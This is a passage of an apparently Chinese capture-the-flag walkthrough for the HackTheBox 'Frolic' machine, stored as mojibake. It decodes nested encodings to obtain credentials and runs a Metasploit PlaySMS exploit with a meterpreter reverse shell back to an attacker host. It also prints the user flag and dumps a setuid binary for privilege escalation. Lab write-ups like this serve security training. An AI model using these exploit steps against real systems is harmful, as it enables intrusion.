K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA\n```\nä¼¼ä¹æ‹¿åˆ°äº†ä¸€æ®µ BASE64 ç¼–ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d                    \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   487    0   487    0     0    749      0 --:--:-- --:--:-- --:--:--   749\nPK     Ã‰7M#ï¿½[ï¿½i index.phpUT     ï¿½|ï¿½[ï¿½|ï¿½[ux\n                                          ^Dï¿½Jï¿½sï¿½hï¿½)ï¿½Pï¿½n\n                                                        ï¿½ï¿½Ssï¿½Jwâ–’Üï¿½ï¿½4ï¿½ï¿½kï¿½zï¿½ï¿½UÈ–ï¿½+Xï¿½ï¿½Pï¿½ï¿½á¶‡ï¿½ï¿½Ğ»ï¿½x_ï¿½Nï¿½[ï¿½ï¿½ï¿½Sï¿½ï¿½8ï¿½ï¿½ï¿½ï¿½ï¿½J2Sï¿½*ï¿½DĞ}ï¿½8dTQkï¿½ï¿½ï¿½ï¿½ï¿½ï¿½j_ï¿½ï¿½ï¿½â–’ï¿½ï¿½ï¿½'xcï¿½ï¿½İtï¿½ï¿½75Qï¿½\n                                                                                                                                                       ï¿½ï¿½ï¿½k,4ï¿½ï¿½b)ï¿½4Fï¿½ï¿½  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&q2oï¿½WÔœï¿½9P#ï¿½[ï¿½iPK     Ã‰7M#ï¿½[ï¿½i â–’ï¿½ï¿½index.phpUTï¿½|ï¿½[ux\n                 PKO\n```\nè§£å¯†åå¾—åˆ°äº†ä¸€äº›ä¹±ç è¾“å‡ºï¼Œæœ‰ç‚¹å¥‡æ€ªï¼Œå°è¯•ç»™ä»–å†™å‡ºåˆ°æ–‡ä»¶ï¼Œç„¶åæŸ¥çœ‹ä¸‹ç±»å‹å‘¢\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d > file\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   487    0   487    0     0    748      0 --:--:-- --:--:-- --:--:--   749\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# file file      \nfile: Zip archive data, at least v2.0 to extract\n```\nè¿™æ˜¯ä¸€ä¸ª zip çš„å‹ç¼©æ–‡ä»¶ï¼Œå»æ›´æ”¹ä¸‹åç¼€ç„¶åå°è¯•è§£å‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# mv file file.zip\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# unzip file.zip            \nArchive:  file.zip\n[file.zip] index.php password: \n   skipping: index.php               incorrect password\n```\næœ‰è§£å‹å¯†ç ï¼Œéšæ‰‹å°è¯•å‡ ä¸ªå¼±å£ä»¤è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# unzip file.zip \nArchive:  file.zip\n[file.zip] index.php password: \n  inflating: index.php\n```\nè§£å‹å¯†ç æ˜¯ passwordï¼ŒæˆåŠŸè§£å‹å‡ºæ¥ä¸€ä¸ª index.php æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat index.php \n4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a\n```\nè¿™åˆæ˜¯ç¼–ç ã€‚ã€‚ã€‚\n\nè¿™åº”è¯¥æ˜¯åå…­è¿›åˆ¶ç¼–ç ï¼Œæˆ‘ä»¬å»è§£å¯†ä¸€ä¸‹\n\n> [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)\n\n![](Hackthebox-Frolic/86c652c4-b79f-4c03-82ce-dd25ea9d33f3.png)\n\nå‡ºæ¥åæ˜¯ base64 ç¼–ç ï¼Œå’±ä»¬å†è§£å¯†ä¸€é‡\n\n![](Hackthebox-Frolic/1917a7b9-6a7e-491f-bc96-6606fc0e9457.png)\n\n```bash\n+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+\n++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---\n<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>\n++..<\n```\nè¿™æ˜¯æ¬¡ brainfuckï¼Œå’±ä»¬å»è§£å¯†ä¸€ä¸‹\n\n> [https://sange.fi/esoteric/brainfuck/impl/interp/i.html](https://sange.fi/esoteric/brainfuck/impl/interp/i.html)\n\n```bash\nusername = admin\npassword = idkwhatispass\n```\n![](Hackthebox-Frolic/3d87af17-a524-4cdf-b36a-052e4bd733b3.png)\n\nåœ¨ /dev/backup ä¸­æç¤ºæœ‰ä¸€ä¸ª /playsms ç›®å½•\n\nå’±ä»¬åœ¨è¿™é‡Œç™»å½•\n\n![](Hackthebox-Frolic/f86bc99c-3c5a-4669-95a9-ae57de18ae0f.png)\n\nç™»å½•æˆåŠŸï¼Œåˆ°å¤„æ‰¾æ‰¾çœ‹\n\nGoogle äº†ä¸€ä¸‹ï¼ŒplaySMS çš„æ¼æ´æŒºå¤šçš„ï¼Œè§£å¯†ç´¯äº†ï¼Œæ‡’å¾—æ‰¾äº†ï¼Œç›´æ¥ msf æ‰“è¯•è¯•å§\n\n```bash\nuse multi/http/playsms_uploadcsv_exec\n\nmsf6 exploit(multi/http/playsms_uploadcsv_exec) > show options \n\nModule options (exploit/multi/http/playsms_uploadcsv_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   idkwhatispass    yes       Password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.111     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      9999             yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /playsms         yes       Base playsms directory path\n   USERNAME   admin            yes       Username to authenticate with\n   VHOST                       no        HTTP server virtual host\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.10      yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   PlaySMS 1.4\n```\næŒ‰ç…§è¿™æ ·è®¾ç½®å¥½ï¼Œç„¶å exploit æ‰§è¡Œå³å¯\n\n```bash\nmsf6 exploit(multi/http/playsms_uploadcsv_exec) > exploit \n\n[*] Started reverse TCP handler on 10.10.14.10:4444 \n[+] Authentication successful: admin:idkwhatispass\n[*] Sending stage (39282 bytes) to 10.10.10.111\n[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.111:52368) at 2022-04-25 23:13:40 -0400\n\nmeterpreter > getuid\nServer username: www-data (33)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™\n\n```bash\nwww-data@frolic:/home/ayush$ cat user.txt\ncat user.txt\n    2ab95909cf509f85a6f476b59a0c2fe0\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nwww-data@frolic:/home/ayush/.binary$ ls -la\nls -la\ntotal 16\ndrwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .\ndrwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..\n-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop\nwww-data@frolic:/home/ayush/.binary$ pwd\npwd\n/home/ayush/.binary\n```\nåœ¨ /home/ayush/.binary ä¸‹å‘ç°äº†ä¸€ä¸ª rop æ–‡ä»¶ï¼Œå¹¶ä¸”æˆ‘ä»¬æ‹¥æœ‰å¯æ‰§è¡Œæƒé™\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ ./rop\n./rop\n[*] Usage: program <message>\n```\nä¼šè·å–æˆ‘ä»¬çš„è¾“å…¥å†…å®¹ï¼Œç„¶åè¾“å‡º\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ base64 rop\nbase64 rop\n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\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwhAQIUIQECAAAAAABAAAAAQAAAAwAAAAMgwQI\nDQAAAKSFBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAAEyCBAgG\nAAAAzIEECAoAAABfAAAACwAAABAAAAAVAAAAAAAAAAMAAAAAoAQIAgAAACgAAAAUAAAAEQAAABcA\nAADkggQIEQAAANyCBAgSAAAACAAAABMAAAAIAAAA/v//b7yCBAj///9vAQAAAPD//2+sggQIAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAA\nAAAAAEaDBAhWgwQIZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUgNS40LjAtNnVidW50\ndTF+MTYuMDQuMTApIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIEECAAA\nAAADAAEAAAAAAGiBBAgAAAAAAwACAAAAAACIgQQIAAAAAAMAAwAAAAAArIEECAAAAAADAAQAAAAA\nAMyBBAgAAAAAAwAFAAAAAABMggQIAAAAAAMABgAAAAAArIIECAAAAAADAAcAAAAAALyCBAgAAAAA\nAwAIAAAAAADcggQIAAAAAAMACQAAAAAA5IIECAAAAAADAAoAAAAAAAyDBAgAAAAAAwALAAAAAAAw\ngwQIAAAAAAMADAAAAAAAkIMECAAAAAADAA0AAAAAAKCDBAgAAAAAAwAOAAAAAACkhQQIAAAAAAMA\nDwAAAAAAuIUECAAAAAADABAAAAAAAPCFBAgAAAAAAwARAAAAAAAkhgQIAAAAAAMAEgAAAAAACJ8E\nCAAAAAADABMAAAAAAAyfBAgAAAAAAwAUAAAAAAAQnwQIAAAAAAMAFQAAAAAAFJ8ECAAAAAADABYA\nAAAAAPyfBAgAAAAAAwAXAAAAAAAAoAQIAAAAAAMAGAAAAAAAIKAECAAAAAADABkAAAAAACigBAgA\nAAAAAwAaAAAAAAAAAAAAAAAAAAMAGwABAAAAAAAAAAAAAAAEAPH/DAAAABCfBAgAAAAAAQAVABkA\nAADggwQIAAAAAAIADgAbAAAAEIQECAAAAAACAA4ALgAAAFCEBAgAAAAAAgAOAEQAAAAooAQIAQAA\nAAEAGgBTAAAADJ8ECAAAAAABABQAegAAAHCEBAgAAAAAAgAOAIYAAAAInwQIAAAAAAEAEwClAAAA\nAAAAAAAAAAAEAPH/AQAAAAAAAAAAAAAABADx/6sAAAAUhwQIAAAAAAEAEgC5AAAAEJ8ECAAAAAAB\nABUAAAAAAAAAAAAAAAAABADx/8UAAAAMnwQIAAAAAAAAEwDWAAAAFJ8ECAAAAAABABYA3wAAAAif\nBAgAAAAAAAATAPIAAADwhQQIAAAAAAAAEQAFAQAAAKAECAAAAAABABgAGwEAAKCFBAgCAAAAEgAO\nACsBAAAAAAAAAAAAACAAAABHAQAA0IMECAQAAAASAg4AjwEAACCgBAgAAAAAIAAZAF0BAAAAAAAA\nAAAAABIAAABvAQAA+IQECDoAAAASAA4AdAEAACigBAgAAAAAEAAZACUBAACkhQQIAAAAABIADwB7\nAQAAAAAAAAAAAAASAAAAjQEAACCgBAgAAAAAEAAZAJoBAAAAAAAAAAAAABIAAACqAQAAAAAAAAAA\nAAAgAAAAuQEAACSgBAgAAAAAEQIZAMYBAAC8hQQIBAAAABEAEADVAQAAAAAAAAAAAAASAAAA8gEA\nAECFBAhdAAAAEgAOANEAAAAsoAQIAAAAABAAGgCTAQAAoIMECAAAAAASAA4AAgIAALiFBAgEAAAA\nEQAQAAkCAAAooAQIAAAAABAAGgAVAgAAm4QECF0AAAASAA4AGgIAAAAAAAAAAAAAEgAAACwCAAAA\nAAAAAAAAACAAAABAAgAAKKAECAAAAAARAhkATAIAAAAAAAAAAAAAIAAAAPwBAAAMgwQIAAAAABIA\nCwAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9i\nYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43MjA5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2Fy\ncmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQByb3Au\nYwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19p\nbml0X2FycmF5X3N0YXJ0AF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8A\nX19saWJjX2NzdV9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX3g4Ni5nZXRfcGNf\ndGh1bmsuYngAcHJpbnRmQEBHTElCQ18yLjAAdnVsbgBfZWRhdGEAc3RyY3B5QEBHTElCQ18yLjAA\nX19kYXRhX3N0YXJ0AHB1dHNAQEdMSUJDXzIuMABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA\nX0lPX3N0ZGluX3VzZWQAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2xpYmNfY3N1X2lu\naXQAX2ZwX2h3AF9fYnNzX3N0YXJ0AG1haW4Ac2V0dWlkQEBHTElCQ18yLjAAX0p2X1JlZ2lzdGVy\nQ2xhc3NlcwBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAAAuc3ltdGFiAC5z\ndHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQA\nLmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJl\nbC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh\nbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5n\nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAABsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAA\nAAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAAcAAAACAAAAiIEECIgBAAAkAAAA\nAAAAAAAAAAAEAAAAAAAAAEQAAAD2//9vAgAAAKyBBAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAABO\nAAAACwAAAAIAAADMgQQIzAEAAIAAAAAGAAAAAQAAAAQAAAAQAAAAVgAAAAMAAAACAAAATIIECEwC\nAABfAAAAAAAAAAAAAAABAAAAAAAAAF4AAAD///9vAgAAAKyCBAisAgAAEAAAAAUAAAAAAAAAAgAA\nAAIAAABrAAAA/v//bwIAAAC8ggQIvAIAACAAAAAGAAAAAQAAAAQAAAAAAAAAegAAAAkAAAACAAAA\n3IIECNwCAAAIAAAABQAAAAAAAAAEAAAACAAAAIMAAAAJAAAAQgAAAOSCBAjkAgAAKAAAAAUAAAAY\nAAAABAAAAAgAAACMAAAAAQAAAAYAAAAMgwQIDAMAACMAAAAAAAAAAAAAAAQAAAAAAAAAhwAAAAEA\nAAAGAAAAMIMECDADAABgAAAAAAAAAAAAAAAQAAAABAAAAJIAAAABAAAABgAAAJCDBAiQAwAACAAA\nAAAAAAAAAAAACAAAAAAAAACbAAAAAQAAAAYAAACggwQIoAMAAAICAAAAAAAAAAAAABAAAAAAAAAA\noQAAAAEAAAAGAAAApIUECKQFAAAUAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAABAAAAAgAAALiFBAi4\nBQAAOAAAAAAAAAAAAAAABAAAAAAAAACvAAAAAQAAAAIAAADwhQQI8AUAADQAAAAAAAAAAAAAAAQA\nAAAAAAAAvQAAAAEAAAACAAAAJIYECCQGAAD0AAAAAAAAAAAAAAAEAAAAAAAAAMcAAAAOAAAAAwAA\nAAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADTAAAADwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAA\nAAAAAAQAAAAAAAAA3wAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAOQAAAAG\nAAAAAwAAABSfBAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACWAAAAAQAAAAMAAAD8nwQI/A8AAAQA\nAAAAAAAAAAAAAAQAAAAEAAAA7QAAAAEAAAADAAAAAKAECAAQAAAgAAAAAAAAAAAAAAAEAAAABAAA\nAPYAAAABAAAAAwAAACCgBAggEAAACAAAAAAAAAAAAAAABAAAAAAAAAD8AAAACAAAAAMAAAAooAQI\nKBAAAAQAAAAAAAAAAAAAAAEAAAAAAAAAAQEAAAEAAAAwAAAAAAAAACgQAAA1AAAAAAAAAAAAAAAB\nAAAAAQAAABEAAAADAAAAAAAAAAAAAABWFwAACgEAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAA\nAAAAAAAAYBAAAJAEAAAeAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPAUAABmAgAAAAAA\nAAAAAAABAAAAAAAAAA==\n```\nç¼–ç è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åå¸¦æˆ‘ä»¬è‡ªå·±çš„æœºå™¨ä¸Šè§£ç æŸ¥çœ‹è°ƒè¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat rop.base64|base64 -d > rop \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# chmod +x rop                  \n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ./rop hello \n[+] Message sent: 